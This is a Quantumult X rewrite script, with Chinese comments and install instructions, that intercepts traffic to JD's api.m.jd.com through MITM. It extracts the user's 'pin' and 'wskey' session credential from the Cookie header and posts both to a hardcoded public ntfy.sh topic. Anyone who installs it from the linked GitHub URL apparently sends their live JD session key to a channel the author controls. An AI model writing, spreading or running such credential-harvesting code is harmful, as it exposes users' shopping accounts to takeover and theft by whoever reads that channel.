/**************************
 * 京东 wskey 抓取 (Quantumult X)
 *
 * 重写规则 (在 [rewrite_local] 添加):
 * ^https?:\/\/api\.m\.jd\.com url script-request-header https://raw.githubusercontent.com/xiaotaiye88/Test/main/qx_jd_wskey.js
 *
 * MITM 主机名: api.m.jd.com
 **************************/

const NTFY_URL = "https://ntfy.sh/HzjHy2codes";

try {
  const cookie = $request.headers["Cookie"] || $request.headers["cookie"] || "";
  const pinM = cookie.match(/pin=([^;]+)/);
  const wskeyM = cookie.match(/wskey=([^;]+)/);

  if (wskeyM && wskeyM[1]) {
    const wskey = wskeyM[1];
    const pin = pinM ? pinM[1] : "unknown";
    const payload = "JDWSKEY pin=" + pin + ";wskey=" + wskey + ";";

    $httpClient.post(
      {
        url: NTFY_URL,
        headers: { "Content-Type": "text/plain", Title: "JD_wskey_" + pin },
        body: payload,
      },
      (err, resp, data) => {
        $notify(
          "✅ JD wskey 已抓取",
          "pin=" + pin,
          "wskey=" + wskey.substring(0, 30) + "..." + (err ? "  推送err:" + err : " 已推送ntfy")
        );
      }
    );
  }
} catch (e) {
  $notify("JD抓取异常", "", String(e));
}

$done({});
